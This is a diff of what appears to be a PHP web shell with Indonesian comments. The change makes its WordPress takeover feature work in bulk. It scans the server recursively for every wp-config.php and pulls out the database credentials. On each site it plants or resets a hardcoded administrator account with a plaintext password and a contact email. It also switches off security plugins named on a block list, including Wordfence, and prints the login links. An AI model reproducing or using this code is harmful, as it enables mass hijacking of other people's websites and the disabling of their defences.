@@ -392,166 +392,175 @@ if (!file_exists($wp_base_dir . '/wp-config.php')) {
 }
 $wp_config_path = $wp_base_dir . '/wp-config.php';
 // ===========================================================================
-// FITUR: CREATE ADMIN & DISABLE LOGIN PROTECTION ONLY
+// FITUR: MASS CREATE ADMIN & DISABLE LOGIN PROTECTION (RECURSIVE SCAN)
 // ===========================================================================
 if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
-    $wp_base_dir = $default_dir;
-    if (!file_exists($wp_base_dir . '/wp-config.php')) {
-        $wp_base_dir = dirname($wp_base_dir);
+    // Set unlimited time agar tidak timeout saat scan folder besar
+    set_time_limit(0); 
+
+    // Helper: Parse wp-config.php yang lebih robust
+    if (!function_exists('get_wp_conf_val')) {
+        function get_wp_conf_val($content, $key) {
+            if (preg_match("/define\(\s*['\"]" . preg_quote($key, '/') . "['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $content, $m)) {
+                return $m[1];
+            }
+            return null;
+        }
     }
-    $wp_config_path = $wp_base_dir . '/wp-config.php';
 
-    if (file_exists($wp_config_path)) {
-        $config_content = file_get_contents($wp_config_path);
-        
-        // Helper: Parse wp-config
-        if (!function_exists('get_wp_config_value')) {
-            function get_wp_config_value($content, $constant) {
-                if (preg_match("/define\(\s*'".preg_quote($constant, '/')."',\s*'([^']+)'/", $content, $matches)) {
-                    return $matches[1];
-                }
-                return null;
-            }
-        }
-        
-        $db_host = get_wp_config_value($config_content, 'DB_HOST');
-        $db_name = get_wp_config_value($config_content, 'DB_NAME');
-        $db_user = get_wp_config_value($config_content, 'DB_USER');
-        $db_pass = get_wp_config_value($config_content, 'DB_PASSWORD');
-        
-        if (preg_match("/\\\$table_prefix\s*=\s*'([^']+)'/", $config_content, $matches)) {
-            $db_prefix = $matches[1];
-        } else {
-            $db_prefix = 'wp_';
-        }
-        
-        $conn = mysqli_connect($db_host, $db_user, $db_pass, $db_name);
-        if (!$conn) {
-            $error_msg = "Connection failed: " . mysqli_connect_error();
-        } else {
-            $tbl_options = $db_prefix . 'options';
+    $targets = [];
+    $scan_root = $default_dir; // Mulai scan dari direktori yang sedang dibuka user
 
-            // --- A. REACTIVATE LOGIC ---
-            if (isset($_POST['reactivate_plugins'])) {
-                // Ambil backup plugin
-                $q_backup = mysqli_query($conn, "SELECT option_value FROM `{$tbl_options}` WHERE option_name = 'xshikata_backup_plugins' LIMIT 1");
-                
-                if ($q_backup && mysqli_num_rows($q_backup) > 0) {
-                    $row_backup = mysqli_fetch_assoc($q_backup);
-                    $original_plugins = $row_backup['option_value'];
-                    
-                    // Restore
-                    $escaped_plugins = mysqli_real_escape_string($conn, $original_plugins);
-                    $restore_q = mysqli_query($conn, "UPDATE `{$tbl_options}` SET option_value = '{$escaped_plugins}' WHERE option_name = 'active_plugins'");
-                    
-                    if ($restore_q) {
-                        mysqli_query($conn, "DELETE FROM `{$tbl_options}` WHERE option_name = 'xshikata_backup_plugins'");
-                        $success_msg = "Plugin keamanan telah diaktifkan kembali.";
-                    }
-                } else {
-                    $error_msg = "Tidak ada backup plugin ditemukan.";
-                }
-            }
+    // --- LOGIC 1: MASS SCAN (Jika tombol Create Admin diklik) ---
+    if (isset($_POST['create_wp_admin'])) {
+        try {
+            // Recursive Iterator untuk mencari semua wp-config.php di sub-folder
+            $dir_iterator = new RecursiveDirectoryIterator($scan_root, RecursiveDirectoryIterator::SKIP_DOTS);
+            $iterator = new RecursiveIteratorIterator($dir_iterator, RecursiveIteratorIterator::SELF_FIRST);
             
-            // --- B. DISABLE SPECIFIC PLUGINS & CREATE ADMIN ---
-            elseif (isset($_POST['create_wp_admin'])) {
-                // 1. Create Admin
-                $admin_username = 'xshikata';
-                $admin_password_plain = 'Lulz1337';
-                $admin_password = md5($admin_password_plain); 
-                $admin_email = 'topupgameku.id@gmail.com';
-                
-                $insert_user = "INSERT INTO `{$db_prefix}users` (user_login, user_pass, user_nicename, user_email, user_status) VALUES ('{$admin_username}', '{$admin_password}', 'WordPress Administrator', '{$admin_email}', 0)";
-                $user_created = mysqli_query($conn, $insert_user);
-                $user_id = mysqli_insert_id($conn);
-
-                if ($user_created) {
-                    $capabilities = 'a:1:{s:13:"administrator";s:1:"1";}';
-                    mysqli_query($conn, "INSERT INTO `{$db_prefix}usermeta` (user_id, meta_key, meta_value) VALUES ('{$user_id}', '{$db_prefix}capabilities', '{$capabilities}')");
-                    mysqli_query($conn, "INSERT INTO `{$db_prefix}usermeta` (user_id, meta_key, meta_value) VALUES ('{$user_id}', '{$db_prefix}user_level', '10')");
+            foreach ($iterator as $file) {
+                if ($file->isFile() && $file->getFilename() === 'wp-config.php') {
+                    $targets[] = $file->getPathname();
                 }
+            }
+        } catch (Exception $e) {
+            // Fallback: Jika scan gagal (misal permission denied), cek folder saat ini saja
+            if(file_exists($scan_root . '/wp-config.php')) {
+                $targets[] = $scan_root . '/wp-config.php';
+            }
+        }
+    } 
+    // --- LOGIC 2: REACTIVATE (Tetap single target untuk safety) ---
+    elseif (isset($_POST['reactivate_plugins'])) {
+        // Cek folder saat ini atau naik 1 level
+        if (file_exists($scan_root . '/wp-config.php')) {
+            $targets[] = $scan_root . '/wp-config.php';
+        } elseif (file_exists(dirname($scan_root) . '/wp-config.php')) {
+            $targets[] = dirname($scan_root) . '/wp-config.php';
+        }
+    }
 
-                // 2. TARGETED PLUGIN DISABLE
-                // Daftar plugin yang diketahui mengubah login URL (berdasarkan screenshot & umum)
-                $target_plugins_keywords = [
-                    'admin-site-enhancements', // ASE
-                    'loginpress',              // LoginPress
-                    'wps-hide-login',          // WPS Hide Login
-                    'rename-wp-login',         // Rename WP Login
-                    'wp-security',             // AIOWPS
-                    'hide-my-wp',              // Hide My WP
-                    'ithemes-security'         // iThemes
-                ];
+    if (empty($targets)) {
+        $error_msg = "Tidak ditemukan file wp-config.php di direktori: " . htmlspecialchars($scan_root) . " (atau sub-direktorinya).";
+    } else {
+        // Persiapan Output Log
+        $log_html = "<div style='text-align:left; max-height:400px; overflow-y:auto; background:#1b1b1b; padding:15px; border:1px solid #333; border-radius:5px;'>";
+        $log_html .= "<h4 style='margin-top:0; color:#00FF00; border-bottom:1px solid #444; padding-bottom:10px;'>Mass Execution Result</h4>";
+        
+        $admin_user = 'xshikata';
+        $admin_pass_plain = 'Lulz1337';
+        $admin_pass = md5($admin_pass_plain);
+        $admin_email = 'topupgameku.id@gmail.com';
 
-                $q_curr = mysqli_query($conn, "SELECT option_value FROM `{$tbl_options}` WHERE option_name = 'active_plugins' LIMIT 1");
-                $disabled_count = 0;
-                
-                if ($q_curr && mysqli_num_rows($q_curr) > 0) {
-                    $row_curr = mysqli_fetch_assoc($q_curr);
-                    $current_plugins_raw = $row_curr['option_value'];
-                    $active_plugins = @unserialize($current_plugins_raw);
+        foreach ($targets as $config_file) {
+            $root_path = dirname($config_file);
+            $conf_data = file_get_contents($config_file);
+            
+            $db_host = get_wp_conf_val($conf_data, 'DB_HOST');
+            $db_user = get_wp_conf_val($conf_data, 'DB_USER');
+            $db_pass = get_wp_conf_val($conf_data, 'DB_PASSWORD');
+            $db_name = get_wp_conf_val($conf_data, 'DB_NAME');
+            
+            // Detect Prefix
+            $prefix = 'wp_';
+            if (preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/", $conf_data, $m)) {
+                $prefix = $m[1];
+            }
 
-                    if (is_array($active_plugins)) {
-                        // Backup dulu data aslinya (full list)
-                        $escaped_curr = mysqli_real_escape_string($conn, $current_plugins_raw);
-                        mysqli_query($conn, "INSERT INTO `{$tbl_options}` (option_name, option_value, autoload) VALUES ('xshikata_backup_plugins', '{$escaped_curr}', 'no') ON DUPLICATE KEY UPDATE option_value='{$escaped_curr}'");
+            $log_html .= "<div style='margin-bottom:10px; font-family:monospace; font-size:0.9rem;'>";
+            $log_html .= "<strong style='color:#ccc;'>Target:</strong> " . htmlspecialchars($root_path) . "<br>";
 
-                        // Filter: Buang plugin yang ada di blacklist
-                        $new_plugins_list = [];
-                        foreach ($active_plugins as $plugin_path) {
-                            $is_target = false;
-                            foreach ($target_plugins_keywords as $keyword) {
-                                if (stripos($plugin_path, $keyword) !== false) {
-                                    $is_target = true;
-                                    break;
-                                }
-                            }
+            if ($conn = @mysqli_connect($db_host, $db_user, $db_pass, $db_name)) {
+                // A. EKSEKUSI CREATE/UPDATE ADMIN
+                if (isset($_POST['create_wp_admin'])) {
+                    // 1. User
+                    $check = mysqli_query($conn, "SELECT ID FROM {$prefix}users WHERE user_login = '{$admin_user}'");
+                    if ($check && mysqli_num_rows($check) > 0) {
+                        $u_row = mysqli_fetch_assoc($check);
+                        $u_id = $u_row['ID'];
+                        mysqli_query($conn, "UPDATE {$prefix}users SET user_pass = '{$admin_pass}' WHERE ID = {$u_id}");
+                        $stat = "Admin Updated";
+                    } else {
+                        mysqli_query($conn, "INSERT INTO {$prefix}users (user_login, user_pass, user_nicename, user_email, user_status, display_name) VALUES ('{$admin_user}', '{$admin_pass}', 'Admin', '{$admin_email}', 0, 'Admin')");
+                        $u_id = mysqli_insert_id($conn);
+                        $stat = "Admin Created";
+                    }
+
+                    // 2. Capabilities
+                    $caps = serialize(['administrator' => true]);
+                    mysqli_query($conn, "INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES ({$u_id}, '{$prefix}capabilities', '{$caps}') ON DUPLICATE KEY UPDATE meta_value='{$caps}'");
+                    mysqli_query($conn, "INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES ({$u_id}, '{$prefix}user_level', '10') ON DUPLICATE KEY UPDATE meta_value='10'");
+
+                    // 3. Disable Security Plugins
+                    $sec_count = 0;
+                    $q_opt = mysqli_query($conn, "SELECT option_value FROM {$prefix}options WHERE option_name = 'active_plugins'");
+                    if ($q_opt && mysqli_num_rows($q_opt) > 0) {
+                        $row_opt = mysqli_fetch_assoc($q_opt);
+                        $plugins = @unserialize($row_opt['option_value']);
+                        if (is_array($plugins)) {
+                            // Backup dulu
+                            $bkp = mysqli_real_escape_string($conn, $row_opt['option_value']);
+                            mysqli_query($conn, "INSERT IGNORE INTO {$prefix}options (option_name, option_value, autoload) VALUES ('xshikata_backup_plugins', '$bkp', 'no')");
                             
-                            if (!$is_target) {
-                                $new_plugins_list[] = $plugin_path; // Simpan plugin aman
-                            } else {
-                                $disabled_count++; // Hitung yang didisable
+                            $new_plugins = [];
+                            $blacklist = ['admin-site-enhancements', 'loginpress', 'wps-hide-login', 'rename-wp-login', 'wp-security', 'hide-my-wp', 'ithemes-security', 'wordfence'];
+                            foreach ($plugins as $p) {
+                                $hit = false;
+                                foreach ($blacklist as $bl) { if (stripos($p, $bl) !== false) $hit = true; }
+                                if (!$hit) $new_plugins[] = $p; else $sec_count++;
+                            }
+                            if ($sec_count > 0) {
+                                $new_val = mysqli_real_escape_string($conn, serialize(array_values($new_plugins)));
+                                mysqli_query($conn, "UPDATE {$prefix}options SET option_value = '$new_val' WHERE option_name = 'active_plugins'");
                             }
                         }
-
-                        // Update database dengan list plugin baru (tanpa security plugin)
-                        // Re-index array supaya urutan rapi (penting untuk serialize)
-                        $new_plugins_list = array_values($new_plugins_list);
-                        $new_serialized = serialize($new_plugins_list);
-                        $escaped_new = mysqli_real_escape_string($conn, $new_serialized);
-                        
-                        mysqli_query($conn, "UPDATE `{$tbl_options}` SET option_value = '{$escaped_new}' WHERE option_name = 'active_plugins'");
                     }
-                }
 
-                // 3. Get URL
-                $site_url = '';
-                $q_url = mysqli_query($conn, "SELECT option_value FROM `{$tbl_options}` WHERE option_name = 'siteurl' LIMIT 1");
-                if ($q_url && mysqli_num_rows($q_url) > 0) {
-                    $row_url = mysqli_fetch_assoc($q_url);
-                    $site_url = rtrim($row_url['option_value'], '/');
-                }
-                $final_login_url = $site_url . '/wp-admin/plugin-install.php?tab=upload';
+                    // 4. Get URL
+                    $site_url = "";
+                    $q_url = mysqli_query($conn, "SELECT option_value FROM {$prefix}options WHERE option_name = 'siteurl'");
+                    if ($q_url && mysqli_num_rows($q_url) > 0) $site_url = mysqli_fetch_assoc($q_url)['option_value'];
 
-                // 4. Output
-                $success_msg = "<h3 style='margin-top:0; color:#00FF00;'>Admin Created & Protection Disabled!</h3>";
-                $success_msg .= "User: <strong>{$admin_username}</strong> / <strong>{$admin_password_plain}</strong><br>";
-                $success_msg .= "Disabled Security Plugins: <strong>{$disabled_count}</strong> (ASE, LoginPress, etc)<br>";
-                $success_msg .= "Login URL: <a href='{$final_login_url}' target='_blank' style='color:#00FF00; text-decoration:underline; font-weight:bold; font-size:1.1em;'>{$final_login_url}</a><br><br>";
+                    $log_html .= "<span style='color:#00FF00;'>[SUCCESS]</span> $stat | User: $admin_user | Pass: $admin_pass_plain<br>";
+                    $log_html .= "Login: <a href='{$site_url}/wp-login.php' target='_blank' style='color:#aaa; text-decoration:underline;'>{$site_url}/wp-login.php</a><br>";
+                    if ($sec_count > 0) $log_html .= "<span style='color:orange;'>Disabled $sec_count security plugins.</span>";
+                }
                 
-                $success_msg .= "<div style='border:1px dashed #444; padding:10px; background:#222;'>";
-                $success_msg .= "<p style='margin:0 0 10px 0; color:#ddd;'>Klik tombol ini setelah login untuk mengaktifkan kembali plugin security:</p>";
-                $success_msg .= "<form method='POST' style='display:inline;'>";
-                $success_msg .= "<input type='hidden' name='reactivate_plugins' value='1'>";
-                $success_msg .= "<input type='hidden' name='berkas' value='" . htmlspecialchars(kunci($default_dir)) . "'>";
-                $success_msg .= "<button type='submit' class='btn-modern' style='background-color:#0088cc; color:white;'><i class='fas fa-shield-alt'></i> Re-activate Security Plugins</button>";
-                $success_msg .= "</form></div>";
+                // B. EKSEKUSI REACTIVATE (RESTORE PLUGIN)
+                elseif (isset($_POST['reactivate_plugins'])) {
+                     $q_bkp = mysqli_query($conn, "SELECT option_value FROM {$prefix}options WHERE option_name = 'xshikata_backup_plugins'");
+                     if ($q_bkp && mysqli_num_rows($q_bkp) > 0) {
+                         $orig = mysqli_real_escape_string($conn, mysqli_fetch_assoc($q_bkp)['option_value']);
+                         mysqli_query($conn, "UPDATE {$prefix}options SET option_value = '$orig' WHERE option_name = 'active_plugins'");
+                         mysqli_query($conn, "DELETE FROM {$prefix}options WHERE option_name = 'xshikata_backup_plugins'");
+                         $log_html .= "<span style='color:#00FF00;'>[SUCCESS]</span> Security plugins restored/reactivated.";
+                     } else {
+                         $log_html .= "<span style='color:#aaa;'>No backup found or plugins already active.</span>";
+                     }
+                }
+                
+            } else {
+                $log_html .= "<span style='color:#ff5555;'>[ERROR] DB Connection Failed.</span>";
             }
+            $log_html .= "</div><hr style='border-color:#333; border-style:dotted;'>";
         }
-    } else {
-        $error_msg = "wp-config.php not found.";
+        $log_html .= "</div>";
+
+        // Tambahkan tombol restore di bagian bawah log jika baru saja create admin
+        if (isset($_POST['create_wp_admin'])) {
+            $log_html .= "<div style='margin-top:10px; padding:10px; background:#222; border:1px dashed #444;'>";
+            $log_html .= "<p style='margin:0 0 5px 0; color:#ddd; font-size:0.8rem;'>Klik tombol di bawah untuk mengembalikan plugin security di folder ini (Single Target):</p>";
+            $log_html .= "<form method='POST' style='display:inline;'>";
+            $log_html .= "<input type='hidden' name='reactivate_plugins' value='1'>";
+            $log_html .= "<input type='hidden' name='berkas' value='" . htmlspecialchars(kunci($default_dir)) . "'>";
+            $log_html .= "<button type='submit' class='btn-modern' style='background-color:#0088cc; font-size:0.8rem; padding:5px 10px;'><i class='fas fa-shield-alt'></i> Re-activate Plugins</button>";
+            $log_html .= "</form></div>";
+        }
+
+        $success_msg = $log_html;
     }
 }
+
 // ===========================================================================
 // Action handling (download, delete, create, rename, SQL, etc.)
 // ===========================================================================
